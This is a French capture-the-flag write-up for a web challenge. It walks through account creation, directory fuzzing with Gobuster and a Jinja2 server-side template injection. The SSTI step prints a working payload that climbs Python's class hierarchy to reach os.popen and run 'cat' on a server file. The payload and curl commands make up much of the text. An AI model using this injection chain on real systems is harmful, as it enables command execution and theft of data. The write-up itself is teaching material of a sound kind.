# Challenge : Profil toxique

## Informations du challenge

| Catégorie | Difficulté | Points | Auteur |
|-----------|------------|--------|--------|
| Web | Facile | 200 | YoyoChaud |

**Preuve :** `0623456789`

---

## Résumé

Ce challenge combine plusieurs vulnérabilités web pour récupérer des informations sensibles :

1. **Authentification** - création de compte et connexion
2. **Directory Fuzzing** - découverte d'endpoint caché
3. **SSTI** - Server-Side Template Injection pour lecture de fichiers

---

## Étape 1 : Création de compte

### Découverte

L'application propose un système d'inscription standard. Il faut créer un compte pour accéder aux fonctionnalités de l'application.

### Analyse

L'endpoint `/register` accepte trois paramètres :
- `username` : nom d'utilisateur
- `password` : mot de passe
- `email` : adresse email

### Exploitation

Création d'un compte utilisateur :

```bash
curl -X POST http://<IP>:<PORT>/register \
  -d "username=hacker123" \
  -d "password=Password123!" \
  -d "email=hacker@test.com"
```

### Résultat

Compte créé avec succès. On peut maintenant se connecter.

---

## Étape 2 : Authentification et récupération du cookie de session

### Contexte

Pour accéder aux fonctionnalités protégées, il faut s'authentifier et récupérer un cookie de session.

### Analyse

L'endpoint `/login` accepte les identifiants et retourne un cookie de session en cas de succès.

### Exploitation

Connexion et sauvegarde du cookie dans un fichier :

```bash
curl -X POST http://<IP>:<PORT>/login \
  -d "username=hacker123" \
  -d "password=Password123!" \
  -c cookies.txt
```

### Résultat

Le cookie de session est sauvegardé dans `cookies.txt` et peut être réutilisé pour les requêtes suivantes.

---

## Étape 3 : Fuzzing pour découvrir l'endpoint caché

### Contexte

Une fois authentifié, il faut découvrir les endpoints cachés de l'application qui pourraient contenir des fonctionnalités sensibles.

### Analyse

Utilisation de Gobuster avec une wordlist standard pour énumérer les endpoints disponibles. Il faut passer le cookie de session pour accéder aux pages protégées.

### Exploitation

Lancement du fuzzing avec Gobuster :

```bash
gobuster dir -u http://<IP>:<PORT> \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -b 404,403 \
  -c "session=VOTRE_COOKIE"
```

Paramètres utilisés :
- `-u` : URL cible
- `-w` : wordlist à utiliser
- `-b` : codes HTTP à ignorer (404, 403)
- `-c` : cookie de session pour les pages authentifiées

### Résultat

Gobuster découvre l'endpoint caché `/about_admin`, qui n'est pas accessible depuis l'interface normale de l'application.

```
/about_admin (Status: 200)
```

### Ce qui ne fonctionne PAS

- Sans cookie de session -> les pages protégées ne sont pas découvertes
- Wordlist trop petite -> l'endpoint `/about_admin` peut ne pas être trouvé
- Mauvais cookie -> accès refusé aux endpoints protégés

---

## Étape 4 : SSTI pour lecture de fichiers

### Contexte

L'endpoint `/about_admin` accepte un paramètre `username` qui est vulnérable à une injection SSTI (Server-Side Template Injection).

### Analyse

L'application utilise un moteur de templates (probablement Jinja2/Flask) qui interprète le contenu du paramètre `username`. On peut exploiter cette faille pour exécuter du code Python et lire des fichiers sur le serveur.

### Détection de la vulnérabilité

Avant d'exploiter la faille, il faut d'abord détecter la présence d'une SSTI. On teste avec des payloads simples :

**Test 1 : Injection basique**
```bash
curl -X POST http://<IP>:<PORT>/about_admin \
  -b cookies.txt \
  -d "username={{7*7}}"
```

Résultat attendu : `49` au lieu de `{{7*7}}` -> la SSTI est confirmée !

### Technique d'exploitation

La chaîne SSTI utilisée exploite l'héritage de classes Python :

```python
{{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat /app/melanie_lefevre').read() }}
```

Décomposition :
1. `''.__class__` - accède à la classe `str`
2. `.__mro__[1]` - remonte à la classe `object` (base de toutes les classes)
3. `.__subclasses__()` - liste toutes les sous-classes de `object`
4. `[104]` - sélectionne une classe spécifique avec accès à `__init__.__globals__`
5. `.__init__.__globals__['sys'].modules['os']` - accède au module `os`
6. `.popen('cat /app/melanie_lefevre').read()` - exécute la commande et lit le résultat

### Exploitation

Envoi de la payload SSTI :

```bash
curl -X POST http://<IP>:<PORT>/about_admin \
  -b cookies.txt \
  -d "username={{ ''.__class__.__mro__[1].__subclasses__()[104].__init__.__globals__['sys'].modules['os'].popen('cat /app/melanie_lefevre').read() }}"
```

### Résultat

```
0623456789
```

C'est le numéro de téléphone de Mélanie Lefèvre !

✅ **Preuve :** `0623456789`
